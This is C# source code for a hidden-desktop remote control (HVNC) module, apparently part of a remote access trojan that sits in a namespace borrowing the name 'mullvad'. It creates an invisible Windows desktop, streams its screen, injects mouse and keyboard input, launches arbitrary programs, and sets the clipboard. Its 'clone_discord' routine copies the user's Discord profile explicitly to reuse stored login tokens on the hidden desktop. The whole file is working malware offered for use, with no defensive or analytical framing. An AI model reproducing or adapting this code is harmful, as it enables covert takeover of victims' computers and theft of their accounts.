using System;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace mullvad.Module.Hvnc
{
    public sealed class HvncClientModule
    {
        public static string ModuleId => "mullvad.hvnc";

        private const string DesktopName     = "hvnc_desktop";
        private const string DesktopFullName  = "WinSta0\\" + DesktopName;

        private static IntPtr        _hDesktop   = IntPtr.Zero;
        private static volatile bool _running    = false;
        private static volatile int  _quality    = 70;
        private static volatile int  _targetFps  = 30;

        private static byte[]        _frameData;
        private static int           _frameW, _frameH;
        private static readonly object        _frameLock = new object();
        private static readonly SemaphoreSlim _readySig  = new SemaphoreSlim(0, 1);

        private static Thread _captureThread;
        private static Thread _inputThread;

        // Input queue — ordered delivery, single processing thread
        private static readonly ConcurrentQueue<string> _evQueue   = new ConcurrentQueue<string>();
        private static readonly SemaphoreSlim           _evSignal  = new SemaphoreSlim(0, int.MaxValue);

        // Mouse-button drag state (for WM_MOUSEMOVE wParam)
        private static IntPtr _dragHwnd  = IntPtr.Zero;
        private static bool   _leftDown  = false;
        private static bool   _rightDown = false;

        // Window-move drag state (title-bar drag via SetWindowPos)
        private static IntPtr _winDragHwnd = IntPtr.Zero;
        private static int    _winDragOffX = 0;
        private static int    _winDragOffY = 0;

        // Wallpaper cache
        private static string _wallpaperPath  = null;
        private static Image  _wallpaper      = null;
        private static byte[] _wallpaperBytes = null;   // keep bytes alive
        private static readonly object _wallLock = new object();

        // ── Entry point ───────────────────────────────────────────────────────

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "start":     return Start(payload);
                    case "get_frame": return GetFrame(payload);
                    case "stop":      return Stop();
                    case "exec":          return Exec(payload);
                    case "clone_discord": return CloneDiscord();
                    case "kill_all":      return KillAll();
                    case "clipboard":     return SetClipboard(payload);
                    default:              return Err("unknown action: " + action);
                }
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // ── Start ─────────────────────────────────────────────────────────────

        private static string Start(string payload)
        {
            if (_running)
            {
                _running = false;
                _evSignal.Release();
                _captureThread?.Join(500);
                _inputThread?.Join(200);
            }

            _quality    = Clamp(ParseInt(payload, "quality", 70), 10, 100);
            _targetFps  = Clamp(ParseInt(payload, "fps",  30),  1, 60);

            if (_hDesktop == IntPtr.Zero || _hDesktop == new IntPtr(-1))
                _hDesktop = CreateDesktop(DesktopName, null, IntPtr.Zero, 0, DESKTOP_ALL, IntPtr.Zero);

            if (_hDesktop == IntPtr.Zero)
                return Err("CreateDesktop failed: " + Marshal.GetLastWin32Error());

            _running = true;

            // Load wallpaper here, on the calling thread, before CaptureLoop
            // calls SetThreadDesktop (which can break registry/GDI+ on hidden-desktop threads).
            PreloadWallpaper();

            _captureThread = new Thread(CaptureLoop)
            {
                IsBackground = true, Name = "HvncCapture",
                Priority = ThreadPriority.AboveNormal
            };
            _captureThread.Start();

            _inputThread = new Thread(InputLoop)
            {
                IsBackground = true, Name = "HvncInput",
                Priority = ThreadPriority.Normal
            };
            _inputThread.Start();

            return "{\"status\":\"ok\"}";
        }

        private static string Stop()
        {
            _running = false;
            _evSignal.Release();

            if (_hDesktop != IntPtr.Zero)
            {
                CloseDesktop(_hDesktop);
                _hDesktop = IntPtr.Zero;
            }

            _leftDown = false; _rightDown = false;
            _dragHwnd = IntPtr.Zero; _winDragHwnd = IntPtr.Zero;
            lock (_wallLock) { _wallpaper?.Dispose(); _wallpaper = null; _wallpaperPath = null; _wallpaperBytes = null; }
        // Next Start() call will preload fresh wallpaper on the calling thread.

            return "{\"status\":\"ok\"}";
        }

        // ── Get frame ─────────────────────────────────────────────────────────

        private static string GetFrame(string payload)
        {
            if (!string.IsNullOrEmpty(payload))
                EnqueueInput(payload);

            if (!_running) return "{\"ok\":false,\"reason\":\"not_running\"}";

            int waitMs = (3000 / _targetFps) + 50;
            if (!_readySig.Wait(waitMs) || !_running) return "{\"ok\":false}";

            byte[] frame; int w, h;
            lock (_frameLock) { frame = _frameData; w = _frameW; h = _frameH; }
            if (frame == null) return "{\"ok\":false}";

            return "{\"ok\":true,\"w\":" + w + ",\"h\":" + h
                 + ",\"data\":\"" + Convert.ToBase64String(frame) + "\"}";
        }

        // ── Capture loop ──────────────────────────────────────────────────────

        private static void CaptureLoop()
        {
            if (!SetThreadDesktop(_hDesktop)) { _running = false; return; }

            var encParams  = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(
                System.Drawing.Imaging.Encoder.Quality, (long)_quality);
            var jpegCodec  = GetJpegCodec();
            var sw         = new Stopwatch();
            Bitmap bmp     = null;
            int    lastW   = 0, lastH = 0;
            var    wins    = new List<IntPtr>(32);

            while (_running)
            {
                sw.Restart();
                try
                {
                    int w = GetSystemMetrics(SM_CXSCREEN);
                    int h = GetSystemMetrics(SM_CYSCREEN);
                    if (w <= 0) w = 1280;
                    if (h <= 0) h = 720;

                    if (bmp == null || w != lastW || h != lastH)
                    {
                        bmp?.Dispose();
                        bmp = new Bitmap(w, h, PixelFormat.Format32bppArgb);
                        lastW = w; lastH = h;
                    }

                    wins.Clear();
                    EnumDesktopWindows(_hDesktop, (hwnd, lp) =>
                    {
                        if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) wins.Add(hwnd);
                        return true;
                    }, IntPtr.Zero);

                    using (var g = Graphics.FromImage(bmp))
                    {
                        // Draw wallpaper as background
                        DrawWallpaper(g, w, h);

                        // Paint windows bottom-to-top (EnumDesktopWindows is top-to-bottom)
                        for (int i = wins.Count - 1; i >= 0; i--)
                        {
                            IntPtr hwnd = wins[i];
                            RECT rc;
                            if (!GetWindowRect(hwnd, out rc)) continue;
                            int ww = rc.right - rc.left;
                            int wh = rc.bottom - rc.top;
                            if (ww <= 0 || wh <= 0 || ww > w * 2 || wh > h * 2) continue;

                            using (var wb = new Bitmap(ww, wh, PixelFormat.Format32bppArgb))
                            using (var wg = Graphics.FromImage(wb))
                            {
                                IntPtr hdc = wg.GetHdc();
                                PrintWindow(hwnd, hdc, PW_RENDERFULLCONTENT);
                                wg.ReleaseHdc(hdc);
                                g.DrawImage(wb, rc.left, rc.top, ww, wh);
                            }
                        }
                    }

                    byte[] encoded;
                    using (var ms = new MemoryStream(w * h / 8))
                    {
                        bmp.Save(ms, jpegCodec, encParams);
                        encoded = ms.ToArray();
                    }

                    lock (_frameLock) { _frameData = encoded; _frameW = w; _frameH = h; }
                    if (_readySig.CurrentCount == 0) _readySig.Release();
                }
                catch { }

                int elapsed = (int)sw.ElapsedMilliseconds;
                int frameMs = 1000 / _targetFps;
                if (elapsed < frameMs) Thread.Sleep(frameMs - elapsed);
            }

            bmp?.Dispose();
        }

        private static void PreloadWallpaper()
        {
            try
            {
                string path = Registry.GetValue(
                    @"HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper", "") as string;
                if (string.IsNullOrEmpty(path) || !File.Exists(path)) return;

                lock (_wallLock)
                {
                    if (path == _wallpaperPath) return;
                    _wallpaper?.Dispose();
                    // Load bytes, then make a fully-decoded independent Bitmap —
                    // Image.FromStream keeps a reference to the stream object; a new
                    // Bitmap(Image) does a pixel-copy that needs no stream at all.
                    _wallpaperBytes = File.ReadAllBytes(path);
                    using var ms  = new MemoryStream(_wallpaperBytes);
                    using var tmp = Image.FromStream(ms);
                    _wallpaper     = new Bitmap(tmp);   // deep copy, stream-independent
                    _wallpaperPath = path;
                }
            }
            catch { }
        }

        private static void DrawWallpaper(Graphics g, int w, int h)
        {
            Image snap;
            lock (_wallLock) { snap = _wallpaper; }

            if (snap != null)
            {
                try
                {
                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                    g.DrawImage(snap, 0, 0, w, h);
                    return;
                }
                catch { }
            }

            g.Clear(Color.FromArgb(50, 50, 50));
        }

        // ── Input queue ───────────────────────────────────────────────────────

        private static void EnqueueInput(string payload)
        {
            _evQueue.Enqueue(payload);
            try { _evSignal.Release(); } catch { }
        }

        private static void InputLoop()
        {
            if (!SetThreadDesktop(_hDesktop)) return;

            while (_running)
            {
                _evSignal.Wait(200);
                string payload;
                while (_evQueue.TryDequeue(out payload))
                    ProcessPayload(payload);
            }
        }

        private static void ProcessPayload(string payload)
        {
            try
            {
                int idx = payload.IndexOf("\"input\"");
                if (idx < 0) return;
                int arrStart = payload.IndexOf('[', idx);
                if (arrStart < 0) return;

                int i = arrStart + 1;
                while (i < payload.Length)
                {
                    while (i < payload.Length && payload[i] != '{' && payload[i] != ']') i++;
                    if (i >= payload.Length || payload[i] == ']') break;

                    int start = i, depth = 0;
                    while (i < payload.Length)
                    {
                        if      (payload[i] == '{') depth++;
                        else if (payload[i] == '}') { depth--; if (depth == 0) { i++; break; } }
                        i++;
                    }
                    DispatchEvent(payload.Substring(start, i - start));
                }
            }
            catch { }
        }

        // ── Input dispatch (runs on the dedicated input thread) ───────────────

        private static void DispatchEvent(string ev)
        {
            string t = GetStr(ev, "t");
            if (t == null) return;

            try
            {
                switch (t)
                {
                    case "mm":
                    {
                        int x = ParseInt(ev, "x", -1), y = ParseInt(ev, "y", -1);
                        if (x < 0 || y < 0) break;

                        // Title-bar window drag: move the window directly via SetWindowPos
                        if (_winDragHwnd != IntPtr.Zero)
                        {
                            SetWindowPos(_winDragHwnd, IntPtr.Zero,
                                x - _winDragOffX, y - _winDragOffY,
                                0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                            break;
                        }

                        IntPtr hwnd = _leftDown || _rightDown ? _dragHwnd : HitTest(x, y);
                        if (hwnd == IntPtr.Zero) break;
                        uint wp = 0;
                        if (_leftDown)  wp |= MK_LBUTTON;
                        if (_rightDown) wp |= MK_RBUTTON;
                        var pt = ScreenToLocal(hwnd, x, y);
                        PostMessage(hwnd, WM_MOUSEMOVE, (IntPtr)wp, MakeLParam(pt.x, pt.y));
                        break;
                    }
                    case "mc":
                    {
                        int  btn = ParseInt(ev, "btn", 0);
                        bool dn  = ParseInt(ev, "dn", 0) == 1;
                        int  x   = ParseInt(ev, "x", -1), y = ParseInt(ev, "y", -1);
                        if (x < 0 || y < 0) break;

                        if (!dn)
                        {
                            // Release: clear all drag state
                            if (btn == 0) _leftDown = false; else _rightDown = false;
                            _winDragHwnd = IntPtr.Zero;
                            // Send button-up to original drag window
                            if (_dragHwnd != IntPtr.Zero)
                            {
                                var pt2 = ScreenToLocal(_dragHwnd, x, y);
                                PostMessage(_dragHwnd, btn == 1 ? WM_RBUTTONUP : WM_LBUTTONUP,
                                    IntPtr.Zero, MakeLParam(pt2.x, pt2.y));
                            }
                            break;
                        }

                        IntPtr hwnd = HitTest(x, y);
                        if (hwnd == IntPtr.Zero) break;

                        if (btn == 0) _leftDown = true; else _rightDown = true;
                        _dragHwnd = hwnd;

                        // Check if clicking the title bar (HTCAPTION = 2)
                        if (btn == 0)
                        {
                            IntPtr ht = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero,
                                MakeLParam(x, y));
                            if ((int)ht == HTCAPTION)
                            {
                                // Begin window-move drag; SetWindowPos handles moves in mm
                                RECT rc; GetWindowRect(hwnd, out rc);
                                _winDragHwnd = hwnd;
                                _winDragOffX = x - rc.left;
                                _winDragOffY = y - rc.top;
                                // Bring window to front
                                SetWindowPos(hwnd, HWND_TOP, 0, 0, 0, 0,
                                    SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
                                break;
                            }
                        }

                        var pt = ScreenToLocal(hwnd, x, y);
                        IntPtr lp = MakeLParam(pt.x, pt.y);
                        if (btn == 1)
                            PostMessage(hwnd, WM_RBUTTONDOWN, (IntPtr)MK_RBUTTON, lp);
                        else
                            PostMessage(hwnd, WM_LBUTTONDOWN, (IntPtr)MK_LBUTTON, lp);
                        break;
                    }
                    case "mdc": // double-click
                    {
                        int x = ParseInt(ev, "x", -1), y = ParseInt(ev, "y", -1);
                        if (x < 0 || y < 0) break;
                        IntPtr hwnd = HitTest(x, y);
                        if (hwnd == IntPtr.Zero) break;
                        var pt = ScreenToLocal(hwnd, x, y);
                        IntPtr lp = MakeLParam(pt.x, pt.y);
                        PostMessage(hwnd, WM_LBUTTONDBLCLK, (IntPtr)MK_LBUTTON, lp);
                        break;
                    }
                    case "mw":
                    {
                        int delta = ParseInt(ev, "delta", 0);
                        int x     = ParseInt(ev, "x", -1);
                        int y     = ParseInt(ev, "y", -1);
                        // WM_MOUSEWHEEL goes to the window under the cursor, not the focused window
                        IntPtr hwnd = (x >= 0 && y >= 0) ? HitTest(x, y) : GetFocusedWindow();
                        if (hwnd == IntPtr.Zero) break;
                        // High word = signed wheel delta; low word = key state
                        int wp = (short)delta << 16;
                        IntPtr lp = (x >= 0 && y >= 0) ? MakeLParam(x, y) : IntPtr.Zero;
                        PostMessage(hwnd, WM_MOUSEWHEEL, (IntPtr)wp, lp);
                        break;
                    }
                    case "kd":
                    {
                        int vk = ParseInt(ev, "vk", 0);
                        if (vk <= 0) break;
                        IntPtr hwnd = GetFocusedWindow();
                        if (hwnd == IntPtr.Zero) break;
                        uint sc = MapVirtualKey((uint)vk, MAPVK_VK_TO_VSC);
                        // Only WM_KEYDOWN — TranslateMessage in the target app generates WM_CHAR.
                        // Posting WM_CHAR ourselves causes doubles (e.g. "Aa" for a single 'a').
                        PostMessage(hwnd, WM_KEYDOWN, (IntPtr)vk, KeyLParam(sc, false, false));
                        break;
                    }
                    case "ku":
                    {
                        int vk = ParseInt(ev, "vk", 0);
                        if (vk <= 0) break;
                        IntPtr hwnd = GetFocusedWindow();
                        if (hwnd == IntPtr.Zero) break;
                        uint sc  = MapVirtualKey((uint)vk, MAPVK_VK_TO_VSC);
                        PostMessage(hwnd, WM_KEYUP, (IntPtr)vk, KeyLParam(sc, true, true));
                        break;
                    }
                }
            }
            catch { }
        }

        // ── Hit testing ───────────────────────────────────────────────────────

        // WindowFromPoint works correctly when the calling thread is on the target desktop
        private static IntPtr HitTest(int x, int y)
        {
            var pt = new POINT { x = x, y = y };
            IntPtr hwnd = WindowFromPoint(pt);
            if (hwnd == IntPtr.Zero) hwnd = RectHitTest(x, y);
            return hwnd;
        }

        // Fallback: enumerate windows and find tightest RECT hit
        private static IntPtr RectHitTest(int x, int y)
        {
            IntPtr best = IntPtr.Zero;
            int bestArea = int.MaxValue;
            EnumDesktopWindows(_hDesktop, (hwnd, lp) =>
            {
                if (!IsWindowVisible(hwnd)) return true;
                RECT rc;
                if (!GetWindowRect(hwnd, out rc)) return true;
                if (x >= rc.left && x < rc.right && y >= rc.top && y < rc.bottom)
                {
                    int area = (rc.right - rc.left) * (rc.bottom - rc.top);
                    if (area < bestArea) { bestArea = area; best = hwnd; }
                }
                return true;
            }, IntPtr.Zero);
            return best;
        }

        private static IntPtr GetFocusedWindow()
        {
            IntPtr result = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hwnd, lp) =>
            {
                if (!IsWindowVisible(hwnd)) return true;
                int pid;
                int tid = GetWindowThreadProcessId(hwnd, out pid);
                if (tid == 0) return true;
                var gi = new GUITHREADINFO { cbSize = Marshal.SizeOf(typeof(GUITHREADINFO)) };
                if (GetGUIThreadInfo((uint)tid, ref gi) && gi.hwndFocus != IntPtr.Zero)
                {
                    result = gi.hwndFocus;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return result;
        }

        private static POINT ScreenToLocal(IntPtr hwnd, int x, int y)
        {
            var pt = new POINT { x = x, y = y };
            ScreenToClient(hwnd, ref pt);
            return pt;
        }

        private static IntPtr KeyLParam(uint sc, bool keyUp, bool previousDown)
        {
            uint lp = 1u                         // repeat count
                    | (sc         << 16)         // scan code
                    | (previousDown ? (1u << 30) : 0u)
                    | (keyUp      ? (1u << 31) : 0u);
            return (IntPtr)(int)lp;
        }

        // ── Launch process ────────────────────────────────────────────────────

        private static string Exec(string payload)
        {
            string path = GetStr(payload, "path");
            if (string.IsNullOrWhiteSpace(path)) return Err("no path");
            if (_hDesktop == IntPtr.Zero)         return Err("hidden desktop not started");

            path = Environment.ExpandEnvironmentVariables(path);

            string exePath = path, args = "";
            int exeIdx = path.IndexOf(".exe", StringComparison.OrdinalIgnoreCase);
            if (exeIdx >= 0)
            {
                exePath = path.Substring(0, exeIdx + 4);
                args    = path.Length > exeIdx + 4 ? path.Substring(exeIdx + 4).TrimStart() : "";
            }
            string cmdLine = args.Length > 0 ? "\"" + exePath + "\" " + args : null;

            var si = new STARTUPINFO
            {
                cb          = Marshal.SizeOf(typeof(STARTUPINFO)),
                lpDesktop   = DesktopFullName,
                dwFlags     = (int)STARTF_USESHOWWINDOW,
                wShowWindow = 1,
            };
            var pi = new PROCESS_INFORMATION();

            // CREATE_NEW_CONSOLE is ignored for GUI-subsystem apps; for console apps (cmd, powershell)
            // it directs the new console window to the hidden desktop via lpDesktop.
            bool ok = CreateProcess(exePath, cmdLine,
                IntPtr.Zero, IntPtr.Zero, false,
                CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);

            if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return "{\"status\":\"ok\"}"; }
            return Err("CreateProcess failed: " + Marshal.GetLastWin32Error());
        }

        // ── Kill all ──────────────────────────────────────────────────────────

        private static string KillAll()
        {
            if (_hDesktop == IntPtr.Zero) return "{\"status\":\"ok\"}";
            var pids = new List<int>();
            EnumDesktopWindows(_hDesktop, (hwnd, lp) =>
            {
                int pid; GetWindowThreadProcessId(hwnd, out pid);
                if (pid > 0 && !pids.Contains(pid)) pids.Add(pid);
                return true;
            }, IntPtr.Zero);
            foreach (int pid in pids)
                try { System.Diagnostics.Process.GetProcessById(pid).Kill(); } catch { }
            return "{\"status\":\"ok\"}";
        }

        // ── Discord clone ─────────────────────────────────────────────────────

        private static string CloneDiscord()
        {
            if (_hDesktop == IntPtr.Zero) return Err("hidden desktop not started");

            string appdata      = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Find Discord.exe — prefer the versioned app- directory over Update.exe
            string discordPath = null;
            string discordDir  = Path.Combine(localAppdata, "Discord");
            if (Directory.Exists(discordDir))
            {
                foreach (string dir in Directory.GetDirectories(discordDir, "app-*"))
                {
                    string cand = Path.Combine(dir, "Discord.exe");
                    if (File.Exists(cand)) { discordPath = cand; break; }
                }
                if (discordPath == null)
                {
                    string upd = Path.Combine(discordDir, "Update.exe");
                    if (File.Exists(upd)) discordPath = upd + " --processStart Discord.exe";
                }
            }
            if (discordPath == null) return Err("Discord not found");

            // Clone the Roaming profile so the new instance has the stored tokens
            string srcProfile  = Path.Combine(appdata, "discord");
            if (!Directory.Exists(srcProfile)) return Err("Discord profile not found");

            string cloneBase    = Path.Combine(Path.GetTempPath(), "hvnc_dc_appdata");
            string cloneDst     = Path.Combine(cloneBase, "discord");
            try { CopyDirectory(srcProfile, cloneDst); }
            catch (Exception ex) { return Err("profile copy: " + ex.Message); }

            return ExecWithEnv(discordPath, new Dictionary<string, string>
            {
                { "APPDATA", cloneBase }
            });
        }

        private static string ExecWithEnv(string path, Dictionary<string, string> envOverrides)
        {
            if (string.IsNullOrWhiteSpace(path)) return Err("no path");
            if (_hDesktop == IntPtr.Zero)         return Err("hidden desktop not started");

            path = Environment.ExpandEnvironmentVariables(path);

            string exePath = path, args = "";
            int exeIdx = path.IndexOf(".exe", StringComparison.OrdinalIgnoreCase);
            if (exeIdx >= 0)
            {
                exePath = path.Substring(0, exeIdx + 4);
                args    = path.Length > exeIdx + 4 ? path.Substring(exeIdx + 4).TrimStart() : "";
            }
            string cmdLine = args.Length > 0 ? "\"" + exePath + "\" " + args : null;

            IntPtr envBlock = BuildEnvBlock(envOverrides);
            var si = new STARTUPINFO
            {
                cb          = Marshal.SizeOf(typeof(STARTUPINFO)),
                lpDesktop   = DesktopFullName,
                dwFlags     = (int)STARTF_USESHOWWINDOW,
                wShowWindow = 1,
            };
            var pi = new PROCESS_INFORMATION();

            bool ok = CreateProcess(exePath, cmdLine,
                IntPtr.Zero, IntPtr.Zero, false,
                CREATE_NEW_PROCESS_GROUP | CREATE_UNICODE_ENVIRONMENT, envBlock, null, ref si, out pi);

            Marshal.FreeHGlobal(envBlock);

            if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return "{\"status\":\"ok\"}"; }
            return Err("CreateProcess failed: " + Marshal.GetLastWin32Error());
        }

        private static IntPtr BuildEnvBlock(Dictionary<string, string> overrides)
        {
            var env = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (System.Collections.DictionaryEntry kv in Environment.GetEnvironmentVariables())
                env[(string)kv.Key] = kv.Value?.ToString() ?? "";
            foreach (var kv in overrides)
                env[kv.Key] = kv.Value;

            var sb = new StringBuilder();
            foreach (var kv in env)
                sb.Append(kv.Key).Append('=').Append(kv.Value).Append('\0');
            sb.Append('\0');

            byte[] bytes = Encoding.Unicode.GetBytes(sb.ToString());
            IntPtr ptr = Marshal.AllocHGlobal(bytes.Length);
            Marshal.Copy(bytes, 0, ptr, bytes.Length);
            return ptr;
        }

        private static void CopyDirectory(string src, string dst)
        {
            Directory.CreateDirectory(dst);
            foreach (string file in Directory.GetFiles(src))
                try { File.Copy(file, Path.Combine(dst, Path.GetFileName(file)), overwrite: true); } catch { }
            foreach (string dir in Directory.GetDirectories(src))
                try { CopyDirectory(dir, Path.Combine(dst, Path.GetFileName(dir))); } catch { }
        }

        // ── Clipboard ─────────────────────────────────────────────────────────

        private static string SetClipboard(string payload)
        {
            string text = GetStr(payload, "text");
            if (text == null) return Err("no text");
            var done = new ManualResetEventSlim(false);
            new Thread(() =>
            {
                try
                {
                    if (_hDesktop != IntPtr.Zero) SetThreadDesktop(_hDesktop);
                    OpenClipboard(IntPtr.Zero); EmptyClipboard();
                    SetClipboardData(CF_UNICODETEXT, Marshal.StringToHGlobalUni(text));
                    CloseClipboard();
                }
                catch { }
                finally { done.Set(); }
            }) { IsBackground = true }.Start();
            done.Wait(500);
            return "{\"status\":\"ok\"}";
        }

        // ── P/Invoke ──────────────────────────────────────────────────────────

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateDesktop(string lpszDesktop, string lpszDevice, IntPtr pDevmode,
                                           int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
        [DllImport("user32.dll", SetLastError = true)] static extern bool CloseDesktop(IntPtr hDesktop);
        [DllImport("user32.dll", SetLastError = true)] static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")] static extern int    GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] static extern bool   IsWindowVisible(IntPtr hwnd);
        [DllImport("user32.dll")] static extern bool   IsIconic(IntPtr hwnd);
        [DllImport("user32.dll")] static extern bool   GetWindowRect(IntPtr hwnd, out RECT rect);
        [DllImport("user32.dll")] static extern bool   ScreenToClient(IntPtr hwnd, ref POINT pt);
        [DllImport("user32.dll")] static extern IntPtr WindowFromPoint(POINT pt);
        [DllImport("user32.dll")] static extern bool   PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool PostMessage(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowPos(IntPtr hwnd, IntPtr hwndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetGUIThreadInfo(uint idThread, ref GUITHREADINFO pgui);

        [DllImport("user32.dll")] static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr handle);

        [DllImport("user32.dll")]
        static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc lpEnumFunc, IntPtr lParam);
        delegate bool EnumDesktopWindowsProc(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern int GetWindowThreadProcessId(IntPtr hwnd, out int lpdwProcessId);

        [DllImport("user32.dll")] static extern bool   OpenClipboard(IntPtr hwnd);
        [DllImport("user32.dll")] static extern bool   EmptyClipboard();
        [DllImport("user32.dll")] static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
        [DllImport("user32.dll")] static extern bool   CloseClipboard();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        // ── Structs ───────────────────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public int cb; public string lpReserved, lpDesktop, lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
            public int dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int left, top, right, bottom; }

        [StructLayout(LayoutKind.Sequential)]
        struct POINT { public int x, y; }

        [StructLayout(LayoutKind.Sequential)]
        struct GUITHREADINFO
        {
            public int    cbSize, flags;
            public IntPtr hwndActive, hwndFocus, hwndCapture, hwndMenuOwner, hwndMoveSize, hwndCaret;
            public RECT   rcCaret;
        }

        // ── Constants ─────────────────────────────────────────────────────────

        const uint DESKTOP_ALL               = 0x01FF;
        const int  SM_CXSCREEN              = 0;
        const int  SM_CYSCREEN              = 1;
        const uint STARTF_USESHOWWINDOW     = 0x0001;
        const uint CREATE_NEW_PROCESS_GROUP = 0x00000200;
        const uint CREATE_NEW_CONSOLE       = 0x00000010;
        const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        const uint CF_UNICODETEXT           = 13;
        const uint PW_RENDERFULLCONTENT     = 0x00000002;
        const uint MAPVK_VK_TO_VSC          = 0;
        const uint SWP_NOSIZE               = 0x0001;
        const uint SWP_NOMOVE               = 0x0002;
        const uint SWP_NOZORDER             = 0x0004;
        const uint SWP_NOACTIVATE           = 0x0010;
        static readonly IntPtr HWND_TOP     = IntPtr.Zero;
        const int  HTCAPTION               = 2;
        const uint WM_NCHITTEST            = 0x0084;

        const uint WM_MOUSEMOVE     = 0x0200;
        const uint WM_LBUTTONDOWN   = 0x0201;
        const uint WM_LBUTTONUP     = 0x0202;
        const uint WM_LBUTTONDBLCLK = 0x0203;
        const uint WM_RBUTTONDOWN   = 0x0204;
        const uint WM_RBUTTONUP     = 0x0205;
        const uint WM_MOUSEWHEEL    = 0x020A;
        const uint WM_KEYDOWN       = 0x0100;
        const uint WM_KEYUP         = 0x0101;
        const uint WM_CHAR          = 0x0102;
        const uint MK_LBUTTON       = 0x0001;
        const uint MK_RBUTTON       = 0x0002;

        // ── Helpers ───────────────────────────────────────────────────────────

        private static IntPtr MakeLParam(int lo, int hi)
            => (IntPtr)(((hi & 0xFFFF) << 16) | (lo & 0xFFFF));

        private static ImageCodecInfo GetJpegCodec()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders())
                if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
            return null;
        }

        private static int Clamp(int v, int lo, int hi) => v < lo ? lo : v > hi ? hi : v;

        private static int ParseInt(string json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            string k = "\"" + key + "\"";
            int idx = json.IndexOf(k); if (idx < 0) return def;
            int colon = json.IndexOf(':', idx + k.Length); if (colon < 0) return def;
            int s = colon + 1;
            while (s < json.Length && json[s] == ' ') s++;
            bool neg = s < json.Length && json[s] == '-'; if (neg) s++;
            int e = s; while (e < json.Length && char.IsDigit(json[e])) e++;
            if (e == s) return def;
            return int.TryParse(json.Substring(s, e - s), out int v) ? (neg ? -v : v) : def;
        }

        private static string GetStr(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            string k = "\"" + key + "\"";
            int idx = json.IndexOf(k); if (idx < 0) return null;
            int colon = json.IndexOf(':', idx + k.Length); if (colon < 0) return null;
            int s = colon + 1;
            while (s < json.Length && json[s] == ' ') s++;
            if (s >= json.Length || json[s] != '"') return null;
            s++;
            var sb = new StringBuilder();
            for (int i = s; i < json.Length; i++)
            {
                if (json[i] == '\\' && i + 1 < json.Length)
                {
                    switch (json[++i])
                    {
                        case '"':  sb.Append('"');  break;
                        case '\\': sb.Append('\\'); break;
                        case 'n':  sb.Append('\n'); break;
                        case 'r':  sb.Append('\r'); break;
                        case 't':  sb.Append('\t'); break;
                        default:   sb.Append(json[i]); break;
                    }
                }
                else if (json[i] == '"') break;
                else sb.Append(json[i]);
            }
            return sb.ToString();
        }

        private static string Err(string msg)
        {
            var sb = new StringBuilder("\"");
            foreach (char c in msg)
            {
                if      (c == '"')  sb.Append("\\\"");
                else if (c == '\\') sb.Append("\\\\");
                else                sb.Append(c);
            }
            sb.Append('"');
            return "{\"error\":" + sb + "}";
        }
    }
}
